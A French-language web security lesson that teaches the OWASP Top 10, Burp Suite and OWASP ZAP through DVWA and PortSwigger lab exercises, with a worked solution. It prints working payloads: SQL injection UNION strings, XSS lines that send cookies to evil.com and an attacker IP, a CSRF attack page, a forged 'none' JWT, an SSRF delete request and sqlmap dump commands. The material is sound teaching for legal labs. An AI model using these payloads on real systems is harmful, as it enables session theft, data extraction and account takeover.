---
tags:
  - Cybersécurité
  - Intermédiaire
  - Pratique
description: "OWASP Top 10, Burp Suite, OWASP ZAP, sécurité des architectures modernes, labs pratiques"
estimated_time: "80 min"
fiche_number: 2
total_fiches: 4
cursus: "Phase 3 - Compétences intermédiaires"
id: "security.cybersecurity.intermediate.securite-web-applicative"
course_id: "security.cybersecurity"
module_id: "security.cybersecurity.intermediate"
content_type: "lesson"
order: 2
---

# 02 - Sécurité Web et Applicative

> **En bref** : À la fin de cette fiche, tu sauras identifier et exploiter les vulnérabilités web les plus courantes (OWASP Top 10), utiliser les outils de test de sécurité web (Burp Suite, OWASP ZAP), et comprendre la sécurité des architectures modernes (REST, GraphQL, JWT, OAuth2). Lecture estimée : 80 min.

!!! warning "Cadre légal : lab et autorisation uniquement"
    Les tests décrits ici (XSS, SQLi, Burp, ZAP, etc.) se font **uniquement** sur labs d'entraînement (DVWA, Juice Shop, PortSwigger Academy) ou cibles d'un programme de bug bounty / contrat avec **autorisation écrite**. Tester un site tiers sans autorisation est illégal en France (Code pénal, art. 323-1 et s.).

## Prérequis

- [Phase 1, fiche 04 - Programmation et scripting](../01-fondamentaux-informatiques/04-programmation-scripting.md) (Python, Bash, JavaScript)
- [Phase 2, fiche 01 - Principes fondamentaux de la sécurité](../02-fondamentaux-securite/01-principes-securite.md)
- [Phase 2, fiche 03 - Sécurité réseau](../02-fondamentaux-securite/03-securite-reseaux.md)
- Connaissances de base en HTTP (méthodes GET/POST, codes de statut, en-têtes)
- Connaissances de base en HTML et JavaScript

## Objectif de cette fiche

À la fin de cette fiche, tu sauras identifier et exploiter les vulnérabilités web les plus courantes (OWASP Top 10), utiliser les outils de test de sécurité web (Burp Suite, OWASP ZAP), et comprendre la sécurité des architectures modernes (REST, GraphQL, JWT, OAuth2).

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Qu'est-ce que l'OWASP Top 10 ?

**Définition** : L'OWASP Top 10 est une liste publiée par l'Open Web Application Security Project qui recense les dix catégories de vulnérabilités web les plus critiques. Elle est mise à jour tous les 3-4 ans (éditions 2017, 2021, puis 2025) et sert de référence mondiale pour la sécurité des applications web.

**Le problème que l'OWASP Top 10 résout** :

Sans l'OWASP Top 10, voici les problèmes rencontrés :

1. **Pas de priorité claire** : les développeurs ne savent pas quelles vulnérabilités corriger en premier parmi les centaines existantes
2. **Formation insuffisante** : les cursus de développement n'enseignent pas systématiquement la sécurité web
3. **Pas de standard d'évaluation** : les auditeurs de sécurité n'ont pas de référentiel commun pour évaluer une application

**Comment l'OWASP Top 10 résout ces problèmes** :

| Problème | Solution apportée par l'OWASP Top 10 |
| --- | --- |
| Pas de priorité claire | Les 10 catégories sont classées par fréquence et impact, permettant de prioriser les corrections |
| Formation insuffisante | Chaque catégorie est documentée avec des exemples de code vulnérable et corrigé |
| Pas de standard d'évaluation | L'OWASP Top 10 est reconnu par les régulateurs (PCI-DSS) et les entreprises comme standard minimum |

**Analogie concrète** : L'OWASP Top 10, c'est comme la liste des 10 causes d'incendie les plus fréquentes dans les bâtiments. Un inspecteur ne peut pas vérifier chaque centimètre carré d'un bâtiment, mais en contrôlant ces 10 points critiques, il couvre la grande majorité des risques.

**Ce que l'OWASP Top 10 n'est PAS** :

- L'OWASP Top 10 n'est pas une liste exhaustive. Il existe des centaines de types de vulnérabilités web. Le Top 10 ne couvre que les plus fréquentes et les plus critiques.
- L'OWASP Top 10 n'est pas un outil de scan. C'est un référentiel de connaissances. Les outils comme Burp Suite ou ZAP implémentent des tests basés sur ces catégories.

**Les 10 catégories (édition 2021)** :

| Code | Catégorie | Description courte |
| --- | --- | --- |
| A01 | Broken Access Control | Contrôles d'accès défaillants (accès à des ressources non autorisées) |
| A02 | Cryptographic Failures | Données sensibles mal chiffrées ou exposées |
| A03 | Injection | Injection SQL, NoSQL, OS, LDAP (inclut le XSS depuis 2021) |
| A04 | Insecure Design | Failles de conception (absence de modèle de menace) |
| A05 | Security Misconfiguration | Mauvaise configuration (services par défaut, en-têtes manquants) |
| A06 | Vulnérable and Outdated Components | Composants et dépendances obsolètes ou vulnérables |
| A07 | Identification and Authentication Failures | Authentification défaillante (sessions, mots de passe faibles) |
| A08 | Software and Data Integrity Failures | Intégrité non vérifiée (mises à jour, désérialisation, CI/CD) |
| A09 | Security Logging and Monitoring Failures | Journalisation et supervision insuffisantes |
| A10 | Server-Side Request Forgery (SSRF) | Le serveur est forcé d'émettre des requêtes vers une cible choisie par l'attaquant |

**Édition 2025** : la 8e édition (OWASP Top 10:2025) confirme A01 Broken Access Control en tête, fait passer Security Misconfiguration en A02, et introduit deux nouvelles catégories : **Software Supply Chain Failures** (élargissement d'A06/A08) et **Mishandling of Exceptional Conditions**. Les exemples de cette fiche s'appuient sur l'édition 2021, encore la plus répandue dans les outils et référentiels (PCI-DSS), mais le principe et la majorité des catégories restent valables d'une édition à l'autre.

### Qu'est-ce que l'injection SQL ?

**Définition** : L'injection SQL est une vulnérabilité qui permet à un attaquant d'insérer du code SQL malveillant dans une requête envoyée à la base de données via un champ de saisie utilisateur. L'attaquant peut ainsi lire, modifier ou supprimer des données auxquelles il ne devrait pas avoir accès.

**Le problème que l'injection SQL exploite** :

Sans protection contre l'injection SQL, voici les problèmes rencontrés :

1. **Extraction de données sensibles** : un attaquant peut lire toutes les tables de la base de données (mots de passe, données personnelles, cartes bancaires)
2. **Contournement d'authentification** : un attaquant peut se connecter sans connaître le mot de passe
3. **Modification ou suppression de données** : un attaquant peut modifier les prix, supprimer des tables entières, ou créer des comptes administrateur

**Exemple de code vulnérable** :

```php
// VULNÉRABLE - Ne jamais faire ceci
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $pdo->query($query);
```

Si l'attaquant saisit `admin' OR '1'='1' --` dans le champ username, la requête devient :

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
```

La condition `'1'='1'` est toujours vraie, et le `--` commente le reste de la requête. L'attaquant est connecté en tant qu'admin.

**Code corrigé** :

```php
// SÉCURISÉ - Utiliser des requêtes préparées
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $_POST['username'], 'password' => $_POST['password']]);
$result = $stmt->fetch();
```

### Qu'est-ce que le XSS (Cross-Site Scripting) ?

**Définition** : Le XSS est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Ce code s'exécute dans le navigateur de la victime avec les mêmes droits que le site légitime.

**Le problème que le XSS exploite** :

Sans protection contre le XSS, voici les problèmes rencontrés :

1. **Vol de session** : le code JavaScript malveillant peut lire les cookies de session et les envoyer à l'attaquant
2. **Hameçonnage** : l'attaquant peut modifier le contenu de la page pour afficher un faux formulaire de connexion
3. **Keylogging** : le script malveillant peut enregistrer tout ce que l'utilisateur tape sur la page

**Les trois types de XSS** :

| Type | Description | Persistance |
| --- | --- | --- |
| Stored XSS | Le code malveillant est stocké en base de données (commentaire, profil). Il s'exécute à chaque fois qu'un utilisateur affiche la page. | Permanent |
| Reflected XSS | Le code malveillant est injecté dans l'URL. Il s'exécute quand la victime clique sur le lien piégé. | Temporaire |
| DOM-based XSS | Le code malveillant manipule le DOM côté client via JavaScript. Le serveur ne voit jamais le payload. | Temporaire |

**Exemple de code vulnérable** :

```php
// VULNÉRABLE - Affichage direct de l'entrée utilisateur
echo "Bienvenue, " . $_GET['name'];
```

Si l'attaquant envoie l'URL `https://site.com/page?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, le navigateur de la victime exécute le script et envoie ses cookies à l'attaquant.

**Code corrigé** :

```php
// SÉCURISÉ - Échapper les caractères spéciaux HTML
echo "Bienvenue, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### Qu'est-ce que le CSRF (Cross-Site Request Forgery) ?

**Définition** : Le CSRF est une attaque qui force le navigateur d'un utilisateur authentifié à envoyer une requête non souhaitée vers un site sur lequel il est connecté. L'attaquant exploite le fait que le navigateur envoie automatiquement les cookies de session.

**Le problème que le CSRF exploite** :

1. **Actions non autorisées** : un attaquant peut forcer un utilisateur à changer son mot de passe, effectuer un virement, ou modifier ses paramètres
2. **Exploitation silencieuse** : la victime ne voit pas l'attaque, car la requête est envoyée en arrière-plan

**Comment se protéger** :

| Méthode | Description |
| --- | --- |
| Token CSRF | Un jeton unique et aléatoire est ajouté à chaque formulaire. Le serveur vérifie que le jeton est valide avant de traiter la requête. |
| Attribut SameSite | L'attribut `SameSite=Strict` ou `SameSite=Lax` sur les cookies empêche le navigateur de les envoyer avec les requêtes cross-origin. |
| En-tête Origin | Le serveur vérifie que l'en-tête `Origin` ou `Referer` de la requête correspond au domaine légitime. |

### Qu'est-ce que le SSRF (Server-Side Request Forgery) ?

**Définition** : Le SSRF est une vulnérabilité qui permet à un attaquant de forcer le serveur à effectuer des requêtes HTTP vers des ressources internes (réseau privé, services cloud, métadonnées) auxquelles le serveur a accès mais pas l'attaquant.

**Le problème que le SSRF exploite** :

1. **Accès au réseau interne** : le serveur peut accéder à des services internes (base de données, API admin) que l'attaquant ne peut pas atteindre directement
2. **Vol de métadonnées cloud** : sur AWS/GCP/Azure, le SSRF permet d'accéder à l'endpoint de métadonnées (169.254.169.254) pour voler des identifiants temporaires
3. **Scan de ports interne** : l'attaquant peut utiliser le serveur comme proxy pour scanner le réseau interne

**Analogie concrète** : Le SSRF, c'est comme demander à un employé qui a accès au coffre-fort d'aller y chercher quelque chose pour toi. L'employé (le serveur) a les clés du coffre (le réseau interne), et tu lui donnes des instructions malveillantes via un formulaire légitime.

### Qu'est-ce que l'IDOR (Insecure Direct Object Reference) ?

**Définition** : L'IDOR est une vulnérabilité où l'application expose une référence directe à un objet interne (identifiant de base de données, nom de fichier) sans vérifier que l'utilisateur a le droit d'y accéder.

**Exemple** :

```text
# L'utilisateur 42 accède à son profil
GET /api/users/42/profile

# L'attaquant change l'identifiant pour accéder au profil d'un autre utilisateur
GET /api/users/1/profile    # Profil de l'administrateur
```

**Comment se protéger** : Vérifier systématiquement que l'utilisateur authentifié a le droit d'accéder à la ressource demandée (contrôle d'accès côté serveur).

### Qu'est-ce que Burp Suite ?

**Définition** : Burp Suite est un outil de test de sécurité web qui agit comme un proxy d'interception. Il se place entre le navigateur et le serveur web pour capturer, analyser et modifier les requêtes HTTP/HTTPS en temps réel.

**Le problème que Burp Suite résout** :

Sans Burp Suite, voici les problèmes rencontrés :

1. **Requêtes invisibles** : le navigateur envoie et reçoit des requêtes HTTP sans que l'utilisateur puisse les voir en détail
2. **Tests manuels fastidieux** : tester chaque paramètre d'une application pour des vulnérabilités prend un temps considérable à la main
3. **Pas de rejeu possible** : sans proxy, il est difficile de modifier et renvoyer une requête pour tester différents payloads

**Comment Burp Suite résout ces problèmes** :

| Problème | Solution apportée par Burp Suite |
| --- | --- |
| Requêtes invisibles | Le proxy intercepte chaque requête et réponse, affichant tous les détails (en-têtes, cookies, paramètres) |
| Tests manuels fastidieux | Le module Intruder automatise l'envoi de centaines de payloads sur un paramètre donné |
| Pas de rejeu possible | Le module Repeater permet de modifier et renvoyer une requête en un clic |

**Ce que Burp Suite n'est PAS** :

- Burp Suite n'est pas un outil offensif autonome. Il ne lance pas d'attaques sans intervention humaine. C'est un outil d'aide au test de sécurité qui nécessite une expertise humaine pour interpréter les résultats.

**Comparaison Burp Suite vs OWASP ZAP** :

| Burp Suite | OWASP ZAP |
| --- | --- |
| Licence commerciale (Community Edition gratuite limitée) | Entièrement gratuit et open source |
| Interface plus ergonomique | Interface fonctionnelle mais moins polie |
| Extensions payantes (BApp Store) | Extensions gratuites (ZAP Marketplace) |
| Standard de l'industrie pour le pentest web | Idéal pour l'apprentissage et les tests automatisés |
| Scanner passif et actif avancé | Scanner passif et actif |

### Qu'est-ce que la sécurité des architectures modernes ?

**Définition** : La sécurité des architectures modernes concerne la protection des applications construites avec des API REST, GraphQL, des microservices, et des mécanismes d'authentification comme JWT et OAuth2/OIDC.

**Les risques spécifiques aux API REST** :

| Risque | Description |
| --- | --- |
| Absence de rate limiting | Un attaquant peut envoyer des milliers de requêtes par seconde pour faire du brute-force ou du déni de service |
| Mass assignment | L'API accepte des champs non prévus dans le JSON, permettant de modifier des attributs protégés (rôle, statut) |
| Broken object-level authorization | L'API ne vérifie pas que l'utilisateur authentifié a le droit d'accéder à l'objet demandé (similaire à l'IDOR) |

**Les risques spécifiques à GraphQL** :

| Risque | Description |
| --- | --- |
| Introspection exposée | L'attaquant peut découvrir tout le schéma de l'API (types, champs, mutations) |
| Requêtes imbriquées | Des requêtes profondément imbriquées peuvent consommer toutes les ressources du serveur (DoS) |
| Batch attacks | L'attaquant peut envoyer plusieurs mutations dans une seule requête pour contourner le rate limiting |

**JWT (JSON Web Token)** : un JWT est un jeton d'authentification signé qui contient les informations de l'utilisateur. Les vulnérabilités courantes incluent :

- **Algorithm confusion** : changer l'algorithme de RS256 à HS256 pour signer le token avec la clé publique
- **None algorithm** : mettre l'algorithme à "none" pour supprimer la vérification de signature
- **Secret faible** : si le secret HMAC est faible, il peut être bruteforcé

---

## Étapes Pratiques

### Étape 1 : Installer OWASP ZAP

OWASP ZAP est l'outil gratuit que nous utiliserons dans cette fiche. Il est suffisant pour apprendre et pratiquer.

```bash
# Installer ZAP sur Linux
# Option 1 : via le package manager
sudo snap install zaproxy --classic

# Option 2 : via le fichier .sh téléchargé depuis zaproxy.org
# chmod +x ZAP_2_15_0_unix.sh
# ./ZAP_2_15_0_unix.sh

# Lancer ZAP
zaproxy &
```

**Résultat attendu** : ZAP s'ouvre avec son interface graphique. L'écran principal affiche les onglets Sites, Alerts, History, et le panneau de configuration du proxy.

```bash
# Configurer le navigateur pour utiliser le proxy ZAP
# Par défaut, ZAP écoute sur localhost:8080
# Dans Firefox : Paramètres > Réseau > Proxy manuel
# HTTP Proxy: 127.0.0.1   Port: 8080
# Cocher "Utiliser ce proxy pour tous les protocoles"

# Installer le certificat CA de ZAP pour intercepter le HTTPS
# Dans ZAP : Options > Dynamic SSL Certificates > Save
# Dans Firefox : Paramètres > Certificats > Importer > sélectionner le certificat ZAP
```

---

### Étape 2 : Installer un lab d'entraînement (DVWA)

DVWA (Damn Vulnérable Web Application) est une application web intentionnellement vulnérable, conçue pour s'entraîner en toute légalité.

```bash
# Lancer DVWA avec Docker
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# Vérifier que DVWA est accessible
curl -s http://localhost:8081 | head -5
```

**Résultat attendu** :

```text
<!DOCTYPE html>
<html>
<head>
    <title>DVWA - Damn Vulnerable Web Application</title>
```

```bash
# Se connecter à DVWA
# URL : http://localhost:8081
# Login : admin
# Password : password
# Aller dans DVWA Security et mettre le niveau sur "Low" pour commencer
```

---

### Étape 3 : Exploiter une injection SQL (DVWA)

```bash
# Dans DVWA, aller dans "SQL Injection"
# Le formulaire demande un User ID

# Étape 1 : Tester si le champ est vulnérable
# Saisir : 1' OR '1'='1
# Si la page affiche tous les utilisateurs, le champ est vulnérable

# Étape 2 : Déterminer le nombre de colonnes
# Saisir : 1' ORDER BY 1 --
# Saisir : 1' ORDER BY 2 --
# Saisir : 1' ORDER BY 3 --    (erreur = il y a 2 colonnes)

# Étape 3 : Extraire les noms de tables
# Saisir : 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --

# Étape 4 : Extraire les colonnes de la table users
# Saisir : 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

# Étape 5 : Extraire les données
# Saisir : 1' UNION SELECT user, password FROM users --
```

**Résultat attendu** :

```text
ID: 1' UNION SELECT user, password FROM users --
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
```

Les "surnames" sont en réalité les hashes MD5 des mots de passe.

```bash
# Utiliser sqlmap pour automatiser l'exploitation (outil en ligne de commande)
# sqlmap détecte et exploite automatiquement les injections SQL
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs
```

---

### Étape 4 : Exploiter un XSS Stored (DVWA)

```bash
# Dans DVWA, aller dans "XSS (Stored)"
# Le formulaire contient deux champs : Name et Message

# Étape 1 : Tester un XSS basique dans le champ Message
# Name : Test
# Message : <script>alert('XSS')</script>

# Si une boîte de dialogue apparaît, le champ est vulnérable au XSS Stored
# Ce script s'exécutera à chaque fois qu'un utilisateur affichera cette page

# Étape 2 : Voler les cookies de session (simulation)
# Message : <script>new Image().src='http://VOTRE_IP:9999/steal?c='+document.cookie</script>

# Pour capturer les cookies, lancer un serveur HTTP temporaire :
python3 -m http.server 9999
```

**Résultat attendu** :

```text
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.1.50 - - [19/Mar/2026 14:30:15] "GET /steal?c=PHPSESSID=abc123;security=low HTTP/1.1" 404 -
```

Le cookie de session est capturé dans la requête.

---

### Étape 5 : Tester un CSRF

```bash
# Le CSRF exploite le fait que le navigateur envoie automatiquement les cookies
# Créer une page HTML malveillante qui change le mot de passe de la victime sur DVWA

# Créer le fichier csrf-attack.html :
```

```html
<!-- csrf-attack.html - Page d'attaque CSRF -->
<!-- Cette page change le mot de passe DVWA de la victime si elle est connectée -->
<html>
<body>
<h1>Page innocente</h1>
<p>Contenu anodin pendant que l'attaque se déroule en arrière-plan...</p>
<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
     style="display:none">
</body>
</html>
```

```bash
# Ouvrir cette page dans le navigateur de la victime (qui est connectée à DVWA)
# Le mot de passe est changé silencieusement

# Protection : vérifier la présence d'un token CSRF dans DVWA en mode "High"
```

---

### Étape 6 : Scanner une application avec OWASP ZAP

```bash
# Méthode 1 : Spider + Active Scan via l'interface graphique
# 1. Dans ZAP, entrer l'URL cible dans la barre "URL to attack"
# 2. Cliquer sur "Attack" pour lancer le spider (découverte des pages)
# 3. Une fois le spider terminé, faire un clic droit sur le site > "Active Scan"

# Méthode 2 : Scan automatisé via la ligne de commande
# ZAP fournit des scripts de scan automatisés
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t http://localhost:8081 \
  -r zap-report.html
```

**Résultat attendu** (extrait) :

```text
WARN-NEW: X-Frame-Options Header Not Set [10020] x 12
WARN-NEW: Absence of Anti-CSRF Tokens [10202] x 8
WARN-NEW: Cookie Without SameSite Attribute [10054] x 3
WARN-NEW: Server Leaks Version Information [10036] x 15
WARN-NEW: X-Content-Type-Options Header Missing [10021] x 18
FAIL-NEW: SQL Injection [40018] x 4
FAIL-NEW: Cross Site Scripting (Reflected) [40012] x 7
FAIL-NEW: 0    WARN-NEW: 5    INFO: 0    IGNORE: 0    PASS: 32
```

---

### Étape 7 : Analyser la sécurité d'un JWT

```bash
# Décoder un JWT sans vérifier la signature (pour analyse)
# Un JWT est composé de trois parties séparées par des points : header.payload.signature

# Exemple de JWT :
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Décoder le header (première partie)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
```

**Résultat attendu** :

```text
{"alg":"HS256","typ":"JWT"}
```

```bash
# Décoder le payload (deuxième partie)
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9" | base64 -d 2>/dev/null
```

**Résultat attendu** :

```text
{"sub":"1234567890","name":"John Doe","role":"user","iat":1516239022}
```

```bash
# Tester l'attaque "none algorithm"
# Si le serveur accepte l'algorithme "none", on peut forger un token sans signature

# 1. Modifier le header pour utiliser l'algorithme "none"
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'

# 2. Modifier le payload pour changer le rôle en "admin"
echo -n '{"sub":"1234567890","name":"John Doe","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_'

# 3. Assembler le JWT sans signature (troisième partie vide)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

---

### Étape 8 : Tester avec Burp Suite Community Edition

```bash
# Télécharger Burp Suite Community Edition depuis portswigger.net
# L'installer et le lancer

# Configuration initiale :
# 1. Temporary project > Next
# 2. Use Burp defaults > Start Burp

# Configurer le proxy :
# 1. Onglet Proxy > Options > vérifier que le listener est sur 127.0.0.1:8080
# 2. Configurer Firefox pour utiliser le proxy (identique à ZAP)

# Intercepter une requête :
# 1. Onglet Proxy > Intercept > Intercept is on
# 2. Naviguer vers une page dans Firefox
# 3. La requête apparaît dans Burp. Tu peux la modifier avant de la transférer.

# Utiliser le Repeater :
# 1. Faire un clic droit sur une requête dans l'onglet HTTP history
# 2. Sélectionner "Send to Repeater"
# 3. Dans l'onglet Repeater, modifier la requête et cliquer "Send"
# 4. Analyser la réponse
```

---

### Étape 9 : Lab PortSwigger Academy (SSRF)

PortSwigger Academy (portswigger.net/web-security) propose des labs gratuits pour chaque vulnérabilité. Voici un exemple de SSRF.

```bash
# Lab : Basic SSRF against the local server
# L'application a une fonctionnalité "Check stock" qui fait une requête HTTP côté serveur

# 1. Intercepter la requête "Check stock" avec Burp
# La requête contient un paramètre : stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

# 2. Modifier l'URL pour accéder à l'interface d'administration locale
# stockApi=http://localhost/admin

# 3. L'application serveur fait une requête vers localhost/admin
#    et renvoie le contenu de la page d'administration

# 4. Utiliser cette technique pour supprimer un utilisateur
# stockApi=http://localhost/admin/delete?username=carlos
```

---

### Étape 10 : SAST et DAST

Les tests de sécurité des applications se divisent en deux catégories complémentaires.

```bash
# SAST (Static Application Security Testing) - Analyse du code source
# Exemples d'outils : Semgrep, SonarQube, Bandit (Python), PHPStan

# Installer Semgrep (outil SAST gratuit et open source)
pip3 install semgrep

# Scanner un projet avec les règles OWASP
semgrep --config=p/owasp-top-ten /chemin/vers/projet/
```

**Résultat attendu** (extrait) :

```text
Scanning 42 files with 150 rules...

/app/controllers/UserController.php
  security.sql-injection
    27: $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
    Severity: ERROR
    Fix: Use parameterized queries instead of string concatenation

/app/views/profile.php
  security.xss
    15: echo $_GET['name'];
    Severity: ERROR
    Fix: Use htmlspecialchars() to escape user input before output
```

```bash
# DAST (Dynamic Application Security Testing) - Analyse de l'application en cours d'exécution
# Exemples d'outils : OWASP ZAP, Burp Suite, Nikto

# Scanner avec Nikto (scanner de vulnérabilités web)
nikto -h http://localhost:8081
```

**Résultat attendu** (extrait) :

```text
- Nikto v2.5.0
+ Target IP:          127.0.0.1
+ Target Hostname:    localhost
+ Target Port:        8081
+ Start Time:         2026-03-19 14:45:00
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The X-Content-Type-Options header is not set.
+ /: Cookie PHPSESSID created without the httponly flag.
+ /: Cookie PHPSESSID created without the secure flag.
+ /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 12 item(s) reported on remote host
```

---

## Commandes Utiles

| Commande | Action |
| --- | --- |
| `zaproxy &` | Lancer OWASP ZAP |
| `docker run -d -p 8081:80 vulnerables/web-dvwa` | Lancer DVWA |
| `docker run -d -p 3000:3000 bkimminich/juice-shop` | Lancer OWASP Juice Shop |
| `sqlmap -u "URL" --dbs` | Détecter et exploiter les injections SQL |
| `sqlmap -u "URL" -D base --tables` | Lister les tables d'une base de données |
| `sqlmap -u "URL" -D base -T table --dump` | Extraire les données d'une table |
| `semgrep --config=p/owasp-top-ten /chemin` | Scanner le code source avec Semgrep |
| `nikto -h URL` | Scanner les vulnérabilités web d'un site |
| `echo "JWT_PART" \| base64 -d` | Décoder une partie d'un JWT |
| `curl -X POST -d '{"query":"{__schema{types{name}}}"}' URL/graphql` | Tester l'introspection GraphQL |

---

## Pièges Fréquents

### Piège 1 : Tester sur des systèmes sans autorisation

**Problème** : Tester des vulnérabilités sur un site web sans autorisation écrite peut être illégal. En France, les art. 323-1 et s. du Code pénal répriment notamment l'accès frauduleux et les atteintes aux systèmes ; d'autres règles (CGU, contrats, droit étranger) peuvent aussi s'appliquer. Même avec de bonnes intentions, tu risques des poursuites.

**Solution** : Utiliser uniquement des labs d'entraînement locaux (DVWA, Juice Shop, PortSwigger Academy) ou participer à des programmes de bug bounty officiels (HackerOne, Bugcrowd) qui fournissent une autorisation légale explicite.

### Piège 2 : Se fier uniquement aux scans automatisés

**Problème** : Les scanners automatisés (ZAP, Nikto) ne détectent qu'une partie des vulnérabilités. Les failles de logique métier (ex : un utilisateur peut modifier le prix d'un article) ne sont pas détectables par un scanner.

**Solution** : Combiner les scans automatisés avec des tests manuels. Les scanners identifient les "fruits à portée de main" (low-hanging fruit), mais les vulnérabilités critiques nécessitent souvent une analyse humaine.

### Piège 3 : Confondre encodage et chiffrement pour la protection XSS

**Problème** : Certains développeurs pensent que l'encodage base64 ou URL-encoding protège contre le XSS. Ce n'est pas le cas : le navigateur décode automatiquement ces encodages.

**Solution** : Utiliser `htmlspecialchars()` en PHP, `{{ variable }}` avec auto-escaping en Twig/Jinja2, ou `textContent` au lieu de `innerHTML` en JavaScript. La protection doit être appliquée au moment de l'affichage (output encoding).

### Piège 4 : Ignorer les en-têtes de sécurité HTTP

**Problème** : Beaucoup d'applications web ne configurent pas les en-têtes de sécurité HTTP, laissant le navigateur sans directives de protection.

**Solution** : Configurer les en-têtes suivants sur le serveur :

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## Checklist de Validation

- [ ] Je connais les 10 catégories de l'OWASP Top 10 et je peux expliquer chacune
- [ ] Je sais exploiter une injection SQL (manuelle et avec sqlmap)
- [ ] Je sais exploiter un XSS (Stored, Reflected, DOM-based)
- [ ] Je comprends le CSRF et je sais comment le prévenir
- [ ] Je comprends le SSRF et l'IDOR
- [ ] Je sais utiliser OWASP ZAP pour scanner une application web
- [ ] Je sais utiliser Burp Suite pour intercepter et modifier des requêtes
- [ ] Je sais décoder et analyser un JWT
- [ ] Je connais la différence entre SAST et DAST
- [ ] Je sais installer et utiliser les labs d'entraînement (DVWA, Juice Shop)

---

## Exercice Pratique

**Énoncé** : Installe DVWA avec Docker, configure-le en niveau "Low", puis réalise les tests suivants :

1. Exploite une injection SQL pour extraire tous les noms d'utilisateurs et leurs hashes de mots de passe
2. Exploite un XSS Stored pour afficher une alerte JavaScript
3. Craque au moins un hash MD5 extrait de la base de données (utilise CrackStation ou hashcat en local)
4. Identifie au moins 3 vulnérabilités supplémentaires avec un scan OWASP ZAP
5. Configure DVWA en niveau "Medium" et tente de contourner les protections mises en place

**Indications** :

- Lance DVWA : `docker run -d -p 8081:80 vulnerables/web-dvwa`
- Les hashes MD5 extraits peuvent être craqués sur crackstation.net (offline : utilise hashcat avec le mode 0)
- En niveau Medium, les protections ajoutent du filtrage : cherche des contournements (encodage, cas alternatifs)
- Documente chaque étape dans un fichier texte pour constituer un rapport de test

**Résultat attendu** : Un rapport documentant les vulnérabilités trouvées, les payloads utilisés, et les résultats obtenus.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

```bash
# Étape 1 : Lancer DVWA
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# Se connecter : admin / password
# Aller dans DVWA Security > Low

# Étape 2 : Injection SQL
# Dans SQL Injection, saisir dans le champ User ID :
# 1' UNION SELECT user, password FROM users --
# Résultat : admin/5f4dcc3b5aa765d61d8327deb882cf99, gordonb/e99a18c428cb38d5f260853678922e03, etc.

# Étape 3 : XSS Stored
# Dans XSS (Stored), saisir :
# Name: Test
# Message: <script>alert('XSS Stored réussi')</script>
# Chaque visite de la page affichera l'alerte

# Étape 4 : Craquer les hashes MD5
# 5f4dcc3b5aa765d61d8327deb882cf99 = password
# e99a18c428cb38d5f260853678922e03 = abc123
# 8d3533d75ae2c3966d7e0d4fcc69216b = charley

# En local avec hashcat :
# echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
# hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Étape 5 : Scan OWASP ZAP
# Lancer ZAP, configurer le proxy, naviguer sur DVWA
# Clic droit sur le site > Active Scan
# Vulnérabilités trouvées :
# - SQL Injection (High)
# - Cross Site Scripting (High)
# - Absence de tokens CSRF (Medium)
# - Cookie sans attribut HttpOnly (Low)
# - Cookie sans attribut Secure (Low)
# - En-têtes de sécurité manquants (Low)

# Étape 6 : Niveau Medium - Contournement
# SQL Injection en Medium : le champ devient un menu déroulant (SELECT)
# Contournement : intercepter la requête avec Burp/ZAP et modifier le paramètre id
# Payload : 1 UNION SELECT user, password FROM users --
